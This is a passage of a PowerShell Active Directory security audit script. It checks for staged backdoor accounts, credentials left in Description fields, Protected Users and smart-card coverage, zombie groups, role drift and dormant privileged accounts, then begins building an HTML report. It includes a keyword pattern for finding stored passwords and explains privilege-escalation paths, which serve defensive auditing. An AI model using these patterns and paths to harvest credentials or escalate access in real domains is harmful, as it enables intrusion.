$backdoorCandidates = @($script:AllUsers | Where-Object {
    $_.Enabled -and
    (-not $_.LastLogonDate) -and
    $_.PasswordLastSet -and
    $_.PasswordLastSet -gt (Get-Date).AddDays(-90) -and    # password set within 90 days
    $_.SamAccountName -notmatch $defaultPattern -and
    $_.Created -lt (Get-Date).AddDays(-14)                 # account older than 14 days (not brand new)
})

if ($backdoorCandidates.Count -gt 0) {
    $backdoorWithPriv =@( @($backdoorCandidates | Where-Object { $_.AdminCount -eq 1 }))
    $sev33_4 = if ($backdoorWithPriv.Count -gt 0) { 'Critical' } else { 'High' }
    Add-Finding "LogonAnomaly" "Suspicious Accounts -- Enabled, Password Set, Never Logged In" $sev33_4 `
        "$($backdoorCandidates.Count) account(s) are enabled with a recently set password but have never logged in ($($backdoorWithPriv.Count) with AdminCount=1). Pattern consistent with backdoor account staging." `
        -Resources ($backdoorCandidates | Select-Object -First 20 | ForEach-Object {
            "$($_.SamAccountName) [PwdSet:$($_.PasswordLastSet.ToString('yyyy-MM-dd'))] [Created:$($_.Created.ToString('yyyy-MM-dd'))] [Admin:$($_.AdminCount -eq 1)]"
        }) `
        -Fix "Investigate each account: verify with HR/IT that each account is intentionally provisioned and the owner identified. Disable pending investigation. Enable account expiry for pre-provisioned accounts: Set-ADAccountExpiration -Identity ACCT -DateTime (start_date)" `
        -MITRE "T1136.001" -CIS "16.8" -Pts 0 -Max 5
    Write-Host "  [!] Suspicious staged accounts: $($backdoorCandidates.Count)" -ForegroundColor Red
} else {
    Add-Finding "LogonAnomaly" "Staged Backdoor Account Pattern" "Good" `
        "No enabled accounts with recently set passwords that have never been used beyond the 14-day provisioning window" -Pts 5 -Max 5
}

# -----------------------------------------------------------------------------
# 33.4 Accounts with Description field containing credential hints
# Administrators sometimes store passwords or setup notes in the AD Description
# attribute -- visible to all domain users by default.
# -----------------------------------------------------------------------------
$credHintPattern = 'pass(word)?|pwd|p@ss|secret|cred(ential)?|default|temp|init(ial)?|welcome|admin\d|setup'
$descCredRisks   = [System.Collections.Generic.List[string]]::new()

try {
    $usersWithDesc = @($script:AllUsers | Where-Object {
        $_.Enabled -and $_.Description -and $_.Description -match $credHintPattern
    })
    $compsWithDesc = @($script:AllComputers | Where-Object {
        $_.Enabled -and $_.Description -and $_.Description -match $credHintPattern
    })

    foreach ($u in $usersWithDesc) { $descCredRisks.Add("[USER]  $($u.SamAccountName): $($u.Description)") }
    foreach ($c in $compsWithDesc)  { $descCredRisks.Add("[COMP] $($c.Name): $($c.Description)") }
}
catch { Write-AuditWarning "33.4 Description credential hints" $_.Exception.Message "LogonAnomaly" }

if ($descCredRisks.Count -eq 0) {
    Add-Finding "LogonAnomaly" "Credentials in AD Description Fields" "Good" `
        "No accounts or computers have Description fields containing credential-pattern keywords" -Pts 3 -Max 3
} else {
    Add-Finding "LogonAnomaly" "Potential Credentials in AD Description Fields" "High" `
        "$($descCredRisks.Count) object(s) have Description fields with credential-pattern keywords. AD Description is readable by all authenticated domain users -- any stored password is domain-wide exposed." `
        -Resources ($descCredRisks | Select-Object -First 25) `
        -Fix "Clear all credential hints from Description: Set-ADUser -Identity ACCT -Description '' or Set-ADComputer. If a password was stored, rotate the credential immediately. Enforce policy: no credentials in AD attributes." `
        -MITRE "T1552.001" -CIS "16.14" -Pts 0 -Max 3
    Write-Host "  [!] Description credential hints: $($descCredRisks.Count)" -ForegroundColor DarkYellow
}

# ===============================================================================
# DOMAIN 34 -- PRIVILEGED ACCESS WORKSTATION (PAW) ENFORCEMENT
# ===============================================================================
# Validates whether privileged accounts are protected by PAW-level controls:
# Protected Users group membership, smart card enforcement for Tier-0 accounts,
# Credential Guard indicators, and admin accounts blocked from internet-exposed
# workstations.
# ===============================================================================
Write-Section "34. PAW & PRIVILEGED ACCOUNT PROTECTION CONTROLS"

# -----------------------------------------------------------------------------
# 34.1 Protected Users group -- Tier-0 admin coverage
# Protected Users: disables NTLM auth, Kerberos delegation, DES/RC4 for TGT,
# limits TGT lifetime to 4h. Most impactful single control for admin protection.
# -----------------------------------------------------------------------------
$protectedUsersCoverage = [System.Collections.Generic.List[string]]::new()
$adminNotProtected      = [System.Collections.Generic.List[string]]::new()

try {
    $protectedUsersGroup = Get-ADGroup -Identity 'Protected Users' @dcParam `
        -ErrorAction Stop
    $protectedMembers = @(Get-ADGroupMember -Identity $protectedUsersGroup -Recursive `
        @dcParam -ErrorAction Stop | Where-Object { $_.objectClass -eq 'user' })
    $protectedSAMs = $protectedMembers.SamAccountName

    # Tier-0 candidates: DA, EA, Schema Admins
    $tier0Candidates = @($script:AllUsers | Where-Object {
        $_.Enabled -and $_.AdminCount -eq 1 -and
        $_.MemberOf -and ($_.MemberOf | Where-Object {
            $_ -match 'Domain Admins|Enterprise Admins|Schema Admins|Administrators'
        })
    })

    foreach ($adm in $tier0Candidates) {
        if ($adm.SamAccountName -notin $protectedSAMs) {
            $adminNotProtected.Add("$($adm.SamAccountName) [DA/EA/SA -- not in Protected Users]")
        }
    }

    $protectedUsersCoverage.Add("Protected Users total members: $($protectedMembers.Count)")
    $protectedUsersCoverage.Add("Tier-0 admin candidates: $($tier0Candidates.Count)")
    $protectedUsersCoverage.Add("Tier-0 admins NOT in Protected Users: $($adminNotProtected.Count)")
}
catch { Write-AuditWarning "34.1 Protected Users coverage" $_.Exception.Message "PAWControls" }

if ($adminNotProtected.Count -eq 0) {
    Add-Finding "PAWControls" "Protected Users -- Tier-0 Coverage" "Good" `
        "All active Tier-0 administrators (DA/EA/SA) are members of Protected Users" -Pts 8 -Max 8
} else {
    Add-Finding "PAWControls" "Protected Users -- Tier-0 Admins Not Protected" "Critical" `
        "$($adminNotProtected.Count) Tier-0 admin account(s) are NOT in Protected Users. These accounts can authenticate via NTLM, are delegatable, and use RC4/DES Kerberos -- all disabled for Protected Users members." `
        -Resources ($adminNotProtected + $protectedUsersCoverage) `
        -Fix @"
# Add all Tier-0 admins to Protected Users:
Add-ADGroupMember -Identity 'Protected Users' -Members @('DA_ACCT1','DA_ACCT2')
# Pre-flight check -- Protected Users breaks:
#   - NTLM authentication (account needs Kerberos-only access paths)
#   - Kerberos delegation (remove TrustedForDelegation first)
#   - DES/RC4 Kerberos (requires AES support on target services)
#   - Credential caching (no WDigest, no TGT caching beyond 4h)
# Test in staging before bulk-adding production DA accounts.
"@ `
        -MITRE "T1550.002" -CIS "4.4" -Pts 0 -Max 8
    Write-Host "  [!!!] Tier-0 admins outside Protected Users: $($adminNotProtected.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 34.2 Smart card requirement for privileged accounts
# Smart card enforced accounts (SMARTCARD_REQUIRED UAC flag) cannot authenticate
# with a password hash alone -- pass-the-hash is blocked at protocol level.
# For DA/EA accounts, this is the gold standard control.
# -----------------------------------------------------------------------------
$UAC_SC_REQUIRED = 0x40000
try {
    $tier0Accounts34 = @($script:AllUsers | Where-Object {
        $_.Enabled -and $_.AdminCount -eq 1 -and
        $_.MemberOf -and ($_.MemberOf | Where-Object {
            $_ -match 'Domain Admins|Enterprise Admins|Schema Admins'
        })
    })

    $scRequired      =@( @($tier0Accounts34 | Where-Object { $_.UserAccountControl -band $UAC_SC_REQUIRED }))
    $noSCRequired    =@( @($tier0Accounts34 | Where-Object { -not ($_.UserAccountControl -band $UAC_SC_REQUIRED) }))
    $scPct           = if ($tier0Accounts34.Count -gt 0) {
                           [math]::Round(($scRequired.Count / $tier0Accounts34.Count) * 100)
                       } else { 100 }

    if ($scPct -ge 80) {
        Add-Finding "PAWControls" "Smart Card Enforcement on Tier-0 Admins" "Good" `
            "$scPct% of Tier-0 admins ($($scRequired.Count)/$($tier0Accounts34.Count)) have SMARTCARD_REQUIRED -- pass-the-hash blocked for these accounts" -Pts 6 -Max 6
    } else {
        Add-Finding "PAWControls" "Smart Card Not Enforced on Tier-0 Admins" "High" `
            "Only $scPct% of Tier-0 admins have SMARTCARD_REQUIRED ($($noSCRequired.Count) without). Password-based auth allows pass-the-hash, credential stuffing, and spray attacks against DA accounts." `
            -Resources ($noSCRequired.SamAccountName) `
            -Fix @"
# Enable smart card requirement for DA accounts:
Set-ADUser -Identity DA_ACCT -SmartcardLogonRequired `$true
# This sets SMARTCARD_REQUIRED UAC flag. Account can only authenticate with a
# smart card + PIN combination. Pass-the-hash is rendered ineffective.
# Pre-requisite: issue smart cards / FIDO2 tokens to all DA account holders.
# Alternative: enforce Windows Hello for Business in full cloud-trust mode.
"@ `
            -MITRE "T1550.002" -CIS "4.5" -Pts 0 -Max 6
        Write-Host "  [!] Tier-0 admins without smart card enforcement: $($noSCRequired.Count)" -ForegroundColor DarkYellow
    }
}
catch { Write-AuditWarning "34.2 Smart card enforcement" $_.Exception.Message "PAWControls" }

# -----------------------------------------------------------------------------
# 34.3 Admin accounts with email / UPN matching mail-enabled mailbox pattern
# DA accounts should not have email -- email exposure creates phishing surface
# and email rules/forwarding can be used to extract intelligence or pivot.
# -----------------------------------------------------------------------------
try {
    $adminWithEmail = @($script:AdminAccounts | Where-Object {
        $_.Enabled -and
        $_.UserPrincipalName -and
        $_.UserPrincipalName -match '@' -and
        # Admin accounts should have a distinct UPN like adm_user@domain.com
        # Flag where the UPN looks like a standard mail address pattern
        $_.SamAccountName -notmatch '^adm[_\-]|^t0[_\-]|^tier0|^priv[_\-]'
    })

    if ($adminWithEmail.Count -gt 0) {
        Add-Finding "PAWControls" "Admin Accounts with Standard Email UPN Pattern" "Medium" `
            "$($adminWithEmail.Count) AdminCount=1 account(s) do not follow a distinct admin naming pattern, suggesting they may be shared with email/daily-use profiles. Admin accounts must be dedicated -- no email, no daily browsing, no standard apps." `
            -Resources ($adminWithEmail.SamAccountName) `
            -Fix "Create separate dedicated admin accounts (adm_jsmith) with no UPN routing to email. Existing DA accounts that dual-purpose as daily accounts must be split. Enforce 'Deny log on locally' for DA accounts on non-PAW endpoints via GPO." `
            -MITRE "T1566.002" -CIS "4.1" -Pts 0 -Max 3
    } else {
        Add-Finding "PAWControls" "Admin Account Naming & Email Separation" "Good" `
            "All AdminCount=1 accounts follow a distinct admin naming convention -- email/user account separation appears enforced" -Pts 3 -Max 3
    }
}
catch { Write-AuditWarning "34.3 Admin email separation" $_.Exception.Message "PAWControls" }

# -----------------------------------------------------------------------------
# 34.4 Credential Guard readiness -- computer count with Virtualization-Based Security
# Credential Guard (part of VBS) protects LSASS secrets in a hypervisor-isolated
# vault. Checks for computers that have been domain-joined after the VBS GPO was
# applied (inferred from OS version and domain join date). True enforcement
# requires registry or SCCM/Intune telemetry -- this check approximates readiness.
# -----------------------------------------------------------------------------
try {
    # Windows 10/11 or Server 2016+ workstations can support Credential Guard
    $cgCapableComputers = @($script:AllComputers | Where-Object {
        $_.Enabled -and (
            $_.OperatingSystem -match 'Windows 10|Windows 11' -or
            ($_.OperatingSystem -match 'Server (2016|2019|2022|2025)')
        )
    })
    $totalComputers =@( @($script:AllComputers | Where-Object { $_.Enabled }).Count)

    if ($cgCapableComputers.Count -gt 0) {
        $cgPct = [math]::Round(($cgCapableComputers.Count / $totalComputers) * 100)
        Add-Finding "PAWControls" "Credential Guard Readiness (OS Capability)" "Info" `
            "$($cgCapableComputers.Count)/$totalComputers ($cgPct%) domain-joined computers run an OS capable of Credential Guard (Win10+/Server2016+). Actual enforcement requires VBS GPO verification." `
            -Fix @"
# Enable Credential Guard via GPO:
# Computer Config -> Admin Templates -> System -> Device Guard
#   -> Turn on Virtualization Based Security = Enabled
#   -> Credential Guard Configuration = Enabled with UEFI lock
# Verify enforcement: Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# SecurityServicesRunning should include 1 (Credential Guard)
"@ `
            -Pts 0 -Max 0
    }
}
catch { Write-AuditWarning "34.4 Credential Guard readiness" $_.Exception.Message "PAWControls" }

# ===============================================================================
# DOMAIN 35 -- ACCESS RECERTIFICATION & STALE ROLE HYGIENE
# ===============================================================================
# Identifies role hygiene issues that accumulate without active recertification:
# accounts that retain access after department/role changes (indicator: MemberOf
# spanning multiple unrelated business-function OUs), groups with no enabled
# members (zombie groups holding ACL rights), and role groups with no GPO or
# resource linkage (orphaned role groups).
# ===============================================================================
Write-Section "35. ACCESS RECERTIFICATION & STALE ROLE HYGIENE"

# -----------------------------------------------------------------------------
# 35.1 Zombie groups -- groups with no enabled members but holding ACL rights
# Zombie groups accumulate over time as members leave. If these groups have
# ACL grants anywhere in the environment, they are a ready-made escalation path:
# add any account to the zombie group -> instantly inherit all ACL rights.
# -----------------------------------------------------------------------------
$zombieGroups = [System.Collections.Generic.List[string]]::new()
try {
    $nonBuiltinGroups = @($script:AllGroups | Where-Object {
        $_.DistinguishedName -notmatch 'CN=Builtin' -and
        $_.DistinguishedName -notmatch 'CN=Users,DC=' -and
        $_.Name -notmatch 'Domain (Users|Computers|Controllers|Guests)|Schema Admins|' +
                           'Enterprise Admins|Administrators|Allowed RODC|Denied RODC|' +
                           'Protected Users|Key Admins|Read-only Domain'
    })

    foreach ($grp in $nonBuiltinGroups) {
        try {
            $members = @(Get-ADGroupMember -Identity $grp.DistinguishedName `
                            @dcParam -ErrorAction Stop |
                         Where-Object { $_.objectClass -eq 'user' })
            $enabledMembers = @($members | Where-Object {
                try {
                    (Get-ADUser -Identity $_.DistinguishedName -Properties Enabled `
                        @dcParam -ErrorAction Stop).Enabled
                } catch { $false }
            })
            if ($enabledMembers.Count -eq 0 -and $grp.adminCount -eq 1) {
                $zombieGroups.Add("Group:'$($grp.Name)' | AdminCount:1 | TotalMembers:$($members.Count) -- ACL rights exist but no enabled members can exercise them")
            } elseif ($enabledMembers.Count -eq 0 -and $grp.MemberOf) {
                $zombieGroups.Add("Group:'$($grp.Name)' | IsNestedIn:$(@($grp.MemberOf).Count) groups | TotalMembers:$($members.Count) -- nested in other groups, propagating phantom rights")
            }
        } catch {}
    }
}
catch { Write-AuditWarning "35.1 Zombie groups" $_.Exception.Message "RoleHygiene" }

if ($zombieGroups.Count -eq 0) {
    Add-Finding "RoleHygiene" "Zombie Group Detection" "Good" `
        "No groups with AdminCount=1 or group nesting found with zero enabled members" -Pts 4 -Max 4
} else {
    Add-Finding "RoleHygiene" "Zombie Groups -- No Enabled Members, ACL Rights Active" "High" `
        "$($zombieGroups.Count) group(s) with no enabled members hold adminCount=1 or are nested in other groups. Anyone added to these groups inherits ACL rights with no approval workflow triggered." `
        -Resources ($zombieGroups | Select-Object -First 30) `
        -Fix "Remove all ACL grants from zombie groups. Delete or disable groups with no business purpose. Enable JIT group membership (Microsoft Entra PIM for Groups or PAM) so group membership is time-bound and requires approval." `
        -MITRE "T1078.002" -CIS "16.5" -Pts 0 -Max 4
    Write-Host "  [!] Zombie groups: $($zombieGroups.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 35.2 Role drift -- accounts spanning multiple unrelated business-unit OUs
# in their group memberships (indicator of role accumulation across job moves)
# -----------------------------------------------------------------------------
$roleDriftRisks = [System.Collections.Generic.List[string]]::new()
$buOUPatterns   = @('Finance','HR','Sales','Marketing','Engineering','IT','Operations','Legal','Compliance','Support')

try {
    foreach ($acct in ($script:AllUsers | Where-Object { $_.Enabled -and @($_.MemberOf).Count -gt 5 } |
                       Select-Object -First 300)) {
        $buMatches = @($acct.MemberOf | ForEach-Object {
            foreach ($bu in $buOUPatterns) {
                if ($_ -match $bu) { $bu; break }
            }
        } | Sort-Object -Unique)

        if ($buMatches.Count -ge 3) {   # spans 3+ distinct business units
            $ou = ($acct.DistinguishedName -replace '^[^,]+,','') -replace ',DC=.*','' -replace 'OU=',''
            $roleDriftRisks.Add("Account:$($acct.SamAccountName) | BusinessUnits:[$($buMatches -join '][')]  | CurrentOU:$ou")
        }
    }
}
catch { Write-AuditWarning "35.2 Role drift" $_.Exception.Message "RoleHygiene" }

if ($roleDriftRisks.Count -eq 0) {
    Add-Finding "RoleHygiene" "Cross-Business-Unit Role Drift" "Good" `
        "No accounts detected with group memberships spanning 3+ distinct business units -- role accumulation patterns not detected" -Pts 3 -Max 3
} else {
    Add-Finding "RoleHygiene" "Role Drift -- Accounts Spanning Multiple Business Units" "Medium" `
        "$($roleDriftRisks.Count) account(s) have group memberships spanning 3 or more distinct business units. Typical pattern after internal job moves where old access is not revoked." `
        -Resources ($roleDriftRisks | Select-Object -First 25) `
        -Fix "Implement annual access recertification for all accounts. For each flagged account, submit to the account owner's current manager for review -- remove all groups not tied to current role. Automate with identity governance (SailPoint, Saviynt, Entra ID Governance)." `
        -MITRE "T1078" -CIS "16.1" -Pts 0 -Max 3
    Write-Host "  [!] Role drift accounts: $($roleDriftRisks.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 35.3 Groups managed by non-existent or disabled managers (ManagedBy orphan)
# Groups with ManagedBy set to a disabled or deleted account have no functional
# owner. Without an owner, no one is accountable for membership approvals,
# and the group exists outside the access governance process.
# -----------------------------------------------------------------------------
$orphanedManagedBy = [System.Collections.Generic.List[string]]::new()
try {
    $managedGroups =@( @($script:AllGroups | Where-Object { $_.ManagedBy }))
    foreach ($grp in $managedGroups) {
        try {
            $mgr = Get-ADObject -Identity $grp.ManagedBy @dcParam `
                        -Properties Enabled, ObjectClass -ErrorAction Stop
            if ($mgr.ObjectClass -eq 'user') {
                $mgrUser = Get-ADUser -Identity $grp.ManagedBy -Properties Enabled `
                                @dcParam -ErrorAction Stop
                if (-not $mgrUser.Enabled) {
                    $orphanedManagedBy.Add("Group:'$($grp.Name)' | ManagedBy:$($grp.ManagedBy -replace ',DC=.*','') [DISABLED]")
                }
            }
        } catch {
            # ManagedBy DN resolves to nothing -- deleted account
            $orphanedManagedBy.Add("Group:'$($grp.Name)' | ManagedBy:$($grp.ManagedBy -replace ',DC=.*','') [NOT FOUND/DELETED]")
        }
    }
}
catch { Write-AuditWarning "35.3 Orphaned ManagedBy" $_.Exception.Message "RoleHygiene" }

if ($orphanedManagedBy.Count -eq 0) {
    Add-Finding "RoleHygiene" "Group Ownership Hygiene" "Good" `
        "All groups with ManagedBy set reference an active, enabled account -- group ownership governance is intact" -Pts 3 -Max 3
} else {
    Add-Finding "RoleHygiene" "Orphaned Group Ownership -- ManagedBy Disabled or Deleted" "Medium" `
        "$($orphanedManagedBy.Count) group(s) have ManagedBy referencing a disabled or deleted account. No functional owner means membership approvals are bypassed and access is ungoverned." `
        -Resources ($orphanedManagedBy | Select-Object -First 30) `
        -Fix "For each orphaned group: assign a new owner: Set-ADGroup -Identity GROUP -ManagedBy NEW_MANAGER_DN. If no valid business owner can be identified, the group likely has no operational purpose -- audit its memberships and consider deletion." `
        -MITRE "T1078" -CIS "16.5" -Pts 0 -Max 3
    Write-Host "  [!] Orphaned group ownership: $($orphanedManagedBy.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 35.4 Long-tenure dormant accounts -- enabled but inactive for 90-365 days
# Distinguishes from 30-day dormancy (Domain 30) to provide tiered stale-access
# view. 90+ day inactive accounts are prime targets for dormant credential abuse.
# -----------------------------------------------------------------------------
$dormant90   = @($script:AllUsers | Where-Object {
    $_.Enabled -and $_.LastLogonDate -and
    $_.LastLogonDate -lt (Get-Date).AddDays(-90) -and
    $_.LastLogonDate -gt (Get-Date).AddDays(-365) -and
    $_.SamAccountName -notmatch $defaultPattern
})
$dormant365  = @($script:AllUsers | Where-Object {
    $_.Enabled -and $_.LastLogonDate -and
    $_.LastLogonDate -lt (Get-Date).AddDays(-365) -and
    $_.SamAccountName -notmatch $defaultPattern
})
$dormantPriv =@( @(($dormant90 + $dormant365) | Where-Object { $_.AdminCount -eq 1 }))

if ($dormantPriv.Count -gt 0) {
    Add-Finding "RoleHygiene" "Long-Tenure Dormant Privileged Accounts" "Critical" `
        "$($dormantPriv.Count) AdminCount=1 account(s) inactive for 90+ days. Dormant privileged credentials are high-value targets: not monitored, not likely to trigger alerts, valid indefinitely." `
        -Resources ($dormantPriv | ForEach-Object {
            "$($_.SamAccountName) [LastLogon:$($_.LastLogonDate.ToString('yyyy-MM-dd'))] [DaysInactive:$([int]((Get-Date)-$_.LastLogonDate).TotalDays)]"
        }) `
        -Fix "Disable all privileged accounts inactive 90+ days: Disable-ADAccount -Identity ACCT. Require re-validation through access request process before re-enabling. Use PAM solution for just-in-time admin access instead of standing privilege." `
        -MITRE "T1078.002" -CIS "16.7" -Pts 0 -Max 6
    Write-Host "  [!!!] Long-tenure dormant privileged accounts: $($dormantPriv.Count)" -ForegroundColor Red
}

if ($dormant90.Count -gt 0 -or $dormant365.Count -gt 0) {
    Add-Finding "RoleHygiene" "Long-Tenure Dormant Account Inventory" "High" `
        "$($dormant90.Count) accounts inactive 90-365 days | $($dormant365.Count) accounts inactive 365+ days. Total stale access surface across $($dormant90.Count + $dormant365.Count) account(s)." `
        -Resources @(
            "90-365 day inactive: $($dormant90.Count)"
            "365+ day inactive: $($dormant365.Count)"
            "Sample 90d: $($dormant90 | Select-Object -First 5 | ForEach-Object { $_.SamAccountName } | Join-String -Separator ', ')"
        ) `
        -Fix "Enforce automated stale-account policy: disable at 90 days inactivity, delete at 180 days. Use AD lifecycle automation: Search-ADAccount -AccountInactive -TimeSpan 90 | Disable-ADAccount. Alert on any reactivation of 90+ day dormant account." `
        -MITRE "T1078" -CIS "16.7" -Pts 0 -Max 4
} else {
    Add-Finding "RoleHygiene" "Long-Tenure Dormant Accounts" "Good" `
        "No accounts inactive for 90+ days detected -- stale access lifecycle appears enforced" -Pts 4 -Max 4
}

# -----------------------------------------------------------------------------
# 35.5 Phase 2 -- Permission Structure Audit Summary
# Consolidated view of all Phase 2 findings for executive reporting.
# -----------------------------------------------------------------------------
$phase2Domains  = @('LateralMovement','RBACAdherence','LogonAnomaly','PAWControls','RoleHygiene')
$phase2Findings =@( @($script:Findings | Where-Object { $_.Domain -in $phase2Domains }))
$phase2Critical =@( @($phase2Findings | Where-Object { $_.Severity -eq 'Critical' }).Count)
$phase2High     =@( @($phase2Findings | Where-Object { $_.Severity -eq 'High' }).Count)
$phase2Medium   =@( @($phase2Findings | Where-Object { $_.Severity -eq 'Medium' }).Count)

Write-Host "`n  +--- PHASE 2 PERMISSION STRUCTURE AUDIT SUMMARY ---+" -ForegroundColor Cyan
Write-Host "  | Lateral Movement Surface  (D31): checks completed  |" -ForegroundColor Cyan
Write-Host "  | RBAC Adherence & PoLP     (D32): checks completed  |" -ForegroundColor Cyan
Write-Host "  | Logon Anomaly Indicators  (D33): checks completed  |" -ForegroundColor Cyan
Write-Host "  | PAW & Privileged Controls (D34): checks completed  |" -ForegroundColor Cyan
Write-Host "  | Recertification Hygiene   (D35): checks completed  |" -ForegroundColor Cyan
Write-Host "  +----------------------------------------------------+" -ForegroundColor Cyan
Write-Host "  | Critical: $phase2Critical  High: $phase2High  Medium: $phase2Medium" -ForegroundColor $(
    if ($phase2Critical -gt 0) { 'Red' } elseif ($phase2High -gt 0) { 'DarkYellow' } else { 'Green' }
)
Write-Host "  +----------------------------------------------------+" -ForegroundColor Cyan

Add-Finding "RoleHygiene" "Phase 2 Permission Audit Summary" "Info" `
    "Phase 2 Internal Permission Structure Audit complete. $phase2Critical Critical | $phase2High High | $phase2Medium Medium findings across Domains 31-35 (Lateral Movement, RBAC, Logon Anomaly, PAW Controls, Role Hygiene)." `
    -Pts 0 -Max 0

# ===============================================================================
# REPORT GENERATION
# ===============================================================================

$pct        = if ($script:MaxScore -gt 0) { [math]::Round(($script:Score / $script:MaxScore) * 100) } else { 0 }
$maturity   = switch ($pct) {
    { $_ -ge 90 } { "Level 5 -- Optimizing" }
    { $_ -ge 75 } { "Level 4 -- Managed" }
    { $_ -ge 55 } { "Level 3 -- Defined" }
    { $_ -ge 35 } { "Level 2 -- Developing" }
    default        { "Level 1 -- Reactive" }
}

$critCount =@( @($script:Findings | Where-Object { $_.Severity -eq 'Critical' }).Count)
$highCount =@( @($script:Findings | Where-Object { $_.Severity -eq 'High' }).Count)
$medCount  =@( @($script:Findings | Where-Object { $_.Severity -eq 'Medium' }).Count)

# Console summary
Write-Host "`n+==========================================================+" -ForegroundColor Cyan
Write-Host "|                HARDENING SCORECARD                      |" -ForegroundColor Cyan
Write-Host "+==========================================================+" -ForegroundColor Cyan
Write-Host "  Domain       : $domFQDN"
Write-Host "  Score        : $($script:Score) / $($script:MaxScore) ($pct%)" -ForegroundColor $(if ($pct -ge 75) { "Green" } elseif ($pct -ge 50) { "Yellow" } else { "Red" })
Write-Host "  Maturity     : $maturity"
Write-Host "  Critical     : $critCount" -ForegroundColor Red
Write-Host "  High         : $highCount" -ForegroundColor DarkYellow
Write-Host "  Medium       : $medCount"  -ForegroundColor Yellow

Write-Host "`n  DOMAIN SCORES:"
foreach ($domain in $script:CatScores.Keys | Sort-Object) {
    $ds  = $script:CatScores[$domain]
    $dp  = if ($ds.Max -gt 0) { [math]::Round(($ds.Score / $ds.Max) * 100) } else { 100 }
    $bar = "#" * [math]::Round($dp/10) + "." * (10 - [math]::Round($dp/10))
    $col = if ($dp -ge 80) { "Green" } elseif ($dp -ge 50) { "Yellow" } else { "Red" }
    Write-Host ("  {0,-22} [{1}] {2,3}% ({3}/{4})" -f $domain, $bar, $dp, $ds.Score, $ds.Max) -ForegroundColor $col
}

# -- HTML Report ----------------------------------------------------------------
if (-not $NoHtml) {

$sevOrder = @{ Critical=0; High=1; Medium=2; Low=3; Good=4; Info=5 }

$domainRows = ""
foreach ($d in $script:CatScores.Keys | Sort-Object) {
    $ds = $script:CatScores[$d]
    $dp = if ($ds.Max -gt 0) { [math]::Round(($ds.Score / $ds.Max) * 100) } else { 100 }
    $bg = if ($dp -ge 80) { "#27ae60" } elseif ($dp -ge 50) { "#f39c12" } else { "#e74c3c" }
    $anchorId = ($d -replace '[^a-zA-Z0-9]','-').ToLower()
    $catIssues =@( @($script:Findings | Where-Object { $_.Domain -eq $d -and $_.Severity -notin @('Good','Info') }).Count)
    $issueLabel = if ($catIssues -gt 0) { "<span class='issue-count'>$catIssues issue$(if($catIssues -ne 1){'s'})</span>" } else { "" }
    $domainRows += "<tr><td><a href='#cat-$anchorId' class='cat-link'>$d</a>$issueLabel</td><td>$($ds.Score)/$($ds.Max)</td><td><div class='bar-outer'><div class='bar-inner' style='width:$dp%;background:$bg'></div></div></td><td style='color:$bg;font-weight:bold'>$dp%</td></tr>"
}

$findingRows = ""
foreach ($f in $script:Findings | Sort-Object { $sevOrder[$_.Severity] } | Where-Object { $_.Severity -notin @('Good','Info') }) {
    $sc = switch ($f.Severity) {
        "Critical" { "#e74c3c" }; "High" { "#e67e22" }
        "Medium"   { "#f1c40f" }; "Low"  { "#3498db" }
        default    { "#27ae60" }
    }
    $anchorId = ($f.Domain -replace '[^a-zA-Z0-9]','-').ToLower()
    $resources = if ($f.Resources) { "<div class='resources'>$($f.Resources -replace '\|','<br>')</div>" } else { "" }
    $attackPath = if ($f.AttackPath) { "<div class='attack-path'><b>Attack Path:</b> $($f.AttackPath)</div>" } else { "" }
    $fix = if ($f.Fix) { "<div class='fix'><b>Fix:</b> <code>$($f.Fix)</code></div>" } else { "" }
    $mitre = if ($f.MITRE) { "<span class='badge mitre'>MITRE $($f.MITRE)</span>" } else { "" }
    $cis = if ($f.CIS) { "<span class='badge cis'>CIS $($f.CIS)</span>" } else { "" }
    # Escape values for use in HTML data attributes (double-quoted)
    $resAttr    = $f.Resources -replace '&','&amp;' -replace '"','&quot;'
    $checkAttr  = $f.Check     -replace '&','&amp;' -replace '"','&quot;'
    $domainAttr = $f.Domain    -replace '&','&amp;' -replace '"','&quot;'
    $findingRows += @"
<tr class="finding-row" data-sev="$($f.Severity)" data-domain="$domainAttr" data-check="$checkAttr" data-res="$resAttr">
  <td><span class='sev' style='background:$sc'>$($f.Severity)</span></td>
  <td><a href='#cat-$anchorId' class='cat-link'><b>$($f.Domain)</b></a></td>
  <td>$($f.Check)<br>$mitre$cis</td>
  <td>$($f.Detail)$resources$attackPath$fix</td>
</tr>
"@
}

# Per-category grouped finding sections
$categoryDetailSections = ""
foreach ($d in $script:CatScores.Keys | Sort-Object) {
    $anchorId = ($d -replace '[^a-zA-Z0-9]','-').ToLower()
    $catFindings =@( @($script:Findings | Where-Object { $_.Domain -eq $d -and $_.Severity -notin @('Good','Info') } | Sort-Object { $sevOrder[$_.Severity] }))
    $ds = $script:CatScores[$d]
    $dp = if ($ds.Max -gt 0) { [math]::Round(($ds.Score / $ds.Max) * 100) } else { 100 }
    $bg = if ($dp -ge 80) { "#27ae60" } elseif ($dp -ge 50) { "#f39c12" } else { "#e74c3c" }

    $catRows = ""
    if ($catFindings.Count -gt 0) {
        foreach ($f in $catFindings) {
            $sc = switch ($f.Severity) {
                "Critical" { "#e74c3c" }; "High" { "#e67e22" }
                "Medium"   { "#f1c40f" }; "Low"  { "#3498db" }
                default    { "#27ae60" }
            }
            $resources = if ($f.Resources) { "<div class='resources'>$($f.Resources -replace '\|','<br>')</div>" } else { "" }
            $attackPath = if ($f.AttackPath) { "<div class='attack-path'><b>Attack Path:</b> $($f.AttackPath)</div>" } else { "" }
            $fix = if ($f.Fix) { "<div class='fix'><b>Fix:</b> <code>$($f.Fix)</code></div>" } else { "" }
            $mitre = if ($f.MITRE) { "<span class='badge mitre'>MITRE $($f.MITRE)</span>" } else { "" }
            $cis = if ($f.CIS) { "<span class='badge cis'>CIS $($f.CIS)</span>" } else { "" }
            $catRows += @"
<tr>
  <td><span class='sev' style='background:$sc'>$($f.Severity)</span></td>
  <td>$($f.Check)<br>$mitre$cis</td>
  <td>$($f.Detail)$resources$attackPath$fix</td>
</tr>
"@
        }
        $noIssues = ""
    } else {
        $noIssues = "<div class='no-issues'>No issues found in this category.</div>"
    }

    $categoryDetailSections += @"
<div class='cat-section' id='cat-$anchorId'>
